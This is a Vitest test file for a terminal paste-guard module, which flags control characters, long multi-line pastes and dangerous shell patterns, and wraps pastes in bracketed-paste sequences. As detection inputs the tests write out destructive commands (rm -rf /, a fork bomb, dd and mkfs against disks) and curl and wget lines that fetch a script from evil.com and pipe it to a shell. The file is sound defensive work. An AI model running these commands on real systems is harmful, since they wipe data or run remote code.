import { describe, it, expect } from "vitest";
import {
  analyzePaste,
  wrapBracketedPaste,
  DEFAULT_PASTE_GUARD_CONFIG,
  DEFAULT_DANGEROUS_PATTERNS,
  PasteGuardConfig,
} from "../src/lib/terminal-paste-guard";

describe("analyzePaste", () => {
  const config = DEFAULT_PASTE_GUARD_CONFIG;

  describe("control character detection", () => {
    it("detects control characters other than newline and tab", () => {
      const content = "hello\x03world"; // ^C
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(true);
      expect(result.reasons).toContain("control-chars");
      expect(result.controlChars).toContain("^C");
    });

    it("detects multiple control characters", () => {
      const content = "\x01start\x04end"; // ^A and ^D
      const result = analyzePaste(content, config);
      expect(result.controlChars).toContain("^A");
      expect(result.controlChars).toContain("^D");
    });

    it("does not flag newline as a control character", () => {
      const content = "line1\nline2";
      const result = analyzePaste(content, config);
      expect(result.controlChars).toHaveLength(0);
    });

    it("does not flag tab as a control character", () => {
      const content = "col1\tcol2";
      const result = analyzePaste(content, config);
      expect(result.controlChars).toHaveLength(0);
    });

    it("detects ESC character", () => {
      const content = "\x1b[31mred\x1b[0m";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(true);
      expect(result.controlChars).toContain("^[");
    });

    it("detects DEL character (0x7f)", () => {
      const content = "hello\x7fworld";
      const result = analyzePaste(content, config);
      expect(result.controlChars).toContain("^?");
    });

    it("deduplicates repeated control characters", () => {
      const content = "\x03\x03\x03";
      const result = analyzePaste(content, config);
      expect(result.controlChars).toHaveLength(1);
      expect(result.controlChars[0]).toBe("^C");
    });
  });

  describe("multi-line detection", () => {
    it("does not flag content at or below the threshold", () => {
      const content = "line1\nline2\nline3\nline4\nline5";
      const result = analyzePaste(content, config);
      expect(result.reasons).not.toContain("multi-line");
      expect(result.lineCount).toBe(5);
    });

    it("flags content exceeding the default threshold of 5 lines", () => {
      const content = "1\n2\n3\n4\n5\n6";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(true);
      expect(result.reasons).toContain("multi-line");
      expect(result.lineCount).toBe(6);
    });

    it("respects a custom multi-line threshold", () => {
      const customConfig: PasteGuardConfig = {
        ...config,
        multiLineThreshold: 3,
      };
      const content = "1\n2\n3\n4";
      const result = analyzePaste(content, customConfig);
      expect(result.reasons).toContain("multi-line");
      expect(result.lineCount).toBe(4);
    });

    it("counts lines correctly for single-line content", () => {
      const content = "just one line";
      const result = analyzePaste(content, config);
      expect(result.lineCount).toBe(1);
      expect(result.reasons).not.toContain("multi-line");
    });
  });

  describe("dangerous pattern detection", () => {
    it("detects rm -rf /", () => {
      const content = "rm -rf /";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(true);
      expect(result.reasons).toContain("dangerous-pattern");
      expect(result.dangerousPatterns.length).toBeGreaterThan(0);
    });

    it("detects rm -rf ~", () => {
      const content = "rm -rf ~/";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects fork bomb", () => {
      const content = ":(){ :|:& };:";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects device writes to /dev/sda", () => {
      const content = "echo data > /dev/sda";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects mkfs command", () => {
      const content = "mkfs.ext4 /dev/sdb1";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects dd if= command", () => {
      const content = "dd if=/dev/zero of=/dev/sda bs=1M";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects chmod -R 777 /", () => {
      const content = "chmod -R 777 /";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects curl piped to sh", () => {
      const content = "curl https://evil.com/script.sh | sh";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("detects wget piped to bash", () => {
      const content = "wget https://evil.com/script.sh | bash";
      const result = analyzePaste(content, config);
      expect(result.reasons).toContain("dangerous-pattern");
    });

    it("does not flag safe commands", () => {
      const content = "ls -la";
      const result = analyzePaste(content, config);
      expect(result.reasons).not.toContain("dangerous-pattern");
      expect(result.dangerousPatterns).toHaveLength(0);
    });

    it("supports custom dangerous patterns", () => {
      const customConfig: PasteGuardConfig = {
        ...config,
        dangerousPatterns: [/drop\s+table/i],
      };
      const content = "DROP TABLE users;";
      const result = analyzePaste(content, customConfig);
      expect(result.reasons).toContain("dangerous-pattern");
    });
  });

  describe("no confirmation required", () => {
    it("allows safe single-line content through without confirmation", () => {
      const content = "echo hello world";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(false);
      expect(result.reasons).toHaveLength(0);
    });

    it("allows content with only newlines and tabs", () => {
      const content = "col1\tcol2\nrow2col1\trow2col2";
      const result = analyzePaste(content, config);
      expect(result.controlChars).toHaveLength(0);
    });

    it("allows empty content", () => {
      const content = "";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(false);
      expect(result.lineCount).toBe(1);
    });
  });

  describe("multiple reasons", () => {
    it("reports all applicable reasons", () => {
      // Multi-line + dangerous pattern + control char
      const content = "line1\nline2\nline3\nline4\nline5\nrm -rf /\x03";
      const result = analyzePaste(content, config);
      expect(result.requiresConfirmation).toBe(true);
      expect(result.reasons).toContain("control-chars");
      expect(result.reasons).toContain("multi-line");
      expect(result.reasons).toContain("dangerous-pattern");
    });
  });

  describe("preview generation", () => {
    it("replaces control characters with visible representations", () => {
      const content = "hello\x03world";
      const result = analyzePaste(content, config);
      expect(result.preview).toBe("hello^Cworld");
    });

    it("shows first 3 and last 3 lines for long content", () => {
      const lines = Array.from({ length: 10 }, (_, i) => `line${i + 1}`);
      const content = lines.join("\n");
      const result = analyzePaste(content, config);
      const previewLines = result.preview.split("\n");
      expect(previewLines[0]).toBe("line1");
      expect(previewLines[1]).toBe("line2");
      expect(previewLines[2]).toBe("line3");
      expect(previewLines[3]).toBe("...");
      expect(previewLines[4]).toBe("line8");
      expect(previewLines[5]).toBe("line9");
      expect(previewLines[6]).toBe("line10");
      expect(previewLines).toHaveLength(7);
    });

    it("shows full content for 6 or fewer lines", () => {
      const content = "1\n2\n3\n4\n5\n6";
      const result = analyzePaste(content, config);
      expect(result.preview).toBe("1\n2\n3\n4\n5\n6");
    });

    it("preserves tabs in preview", () => {
      const content = "col1\tcol2";
      const result = analyzePaste(content, config);
      expect(result.preview).toBe("col1\tcol2");
    });
  });
});

describe("wrapBracketedPaste", () => {
  it("wraps content with bracketed paste escape sequences", () => {
    const content = "hello world";
    const result = wrapBracketedPaste(content);
    expect(result).toBe("\x1b[200~hello world\x1b[201~");
  });

  it("preserves content exactly (no modification)", () => {
    const content = "rm -rf /\x03\nline2";
    const result = wrapBracketedPaste(content);
    expect(result.startsWith("\x1b[200~")).toBe(true);
    expect(result.endsWith("\x1b[201~")).toBe(true);
    // Extract the inner content
    const inner = result.slice(6, -6);
    expect(inner).toBe(content);
  });

  it("handles empty content", () => {
    const result = wrapBracketedPaste("");
    expect(result).toBe("\x1b[200~\x1b[201~");
  });

  it("handles content with existing escape sequences", () => {
    const content = "\x1b[31mred text\x1b[0m";
    const result = wrapBracketedPaste(content);
    expect(result).toBe(`\x1b[200~${content}\x1b[201~`);
  });
});

describe("DEFAULT_PASTE_GUARD_CONFIG", () => {
  it("has paste guard enabled by default", () => {
    expect(DEFAULT_PASTE_GUARD_CONFIG.enabled).toBe(true);
  });

  it("has a multi-line threshold of 5", () => {
    expect(DEFAULT_PASTE_GUARD_CONFIG.multiLineThreshold).toBe(5);
  });

  it("includes dangerous patterns", () => {
    expect(DEFAULT_PASTE_GUARD_CONFIG.dangerousPatterns.length).toBeGreaterThan(0);
  });
});

describe("DEFAULT_DANGEROUS_PATTERNS", () => {
  it("is an array of RegExp", () => {
    for (const pattern of DEFAULT_DANGEROUS_PATTERNS) {
      expect(pattern).toBeInstanceOf(RegExp);
    }
  });
});
